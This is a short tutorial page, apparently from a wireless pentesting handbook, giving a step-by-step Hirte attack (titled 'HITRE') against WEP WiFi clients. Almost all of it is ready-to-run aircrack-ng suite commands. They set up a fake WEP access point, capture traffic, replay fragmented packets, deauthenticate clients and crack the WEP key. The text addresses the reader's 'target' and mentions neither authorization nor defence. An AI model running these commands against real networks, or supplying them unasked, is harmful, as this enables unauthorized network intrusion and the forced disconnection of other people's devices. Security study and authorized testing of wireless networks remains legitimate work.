# HITRE Attack

## **HITRE Attack**

***

The HITRE (Hirte Attack) is a targeted attack aimed at clients within WiFi networks, specifically exploiting vulnerabilities in WEP (Wired Equivalent Privacy) authentication. To successfully execute this attack, you'll need to be familiar with the SSIDs of your target's WiFi networks. Here's a detailed guide on how to conduct the HITRE Attack:

It's important to note that the HITRE Attack primarily targets clients, not wireless access points. You must have knowledge of the SSIDs associated with your target's WiFi networks.

### **Set Up a Fake WEP WiFi Network**

If the real WiFi network is not present, you can create a fake WEP WiFi network using the following command

```bash
airbase-ng -W 1 -N wlan0mon -c 8 --essid essid -a FF:FF:FF:FF:FF:FF
```

### **Adjust Wireless Interface Power (If Necessary)**

To misassociate clients with the fake WiFi network, you may need to increase the power of your wireless network interface. Refer to Step 1 (Configuration) for guidance on how to achieve this.

### **Monitor the Real/Fake WiFi Network**

Capture handshakes and requests by monitoring either the real or fake WiFi network using the following command

```bash
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

### **Initiate Packet Replay to Target Clients**

Begin replaying packets to clients within your range using this command:

```bash
aireplay-ng --cfrag -D wlan1 -e essid -h FF:FF:FF:FF:FF:FF
```

### **Deauthenticate Clients from the Real/Fake WiFi Network**

If necessary, you can forcefully disconnect clients from the real or fake WiFi network with the following command

```bash
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

### **Crack the WEP Authentication**

After collecting sufficient data through packet replay and monitoring, you can proceed to crack the WEP authentication using the 'aircrack-ng' tool

```bash
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF airodump_essid_results*.cap
```
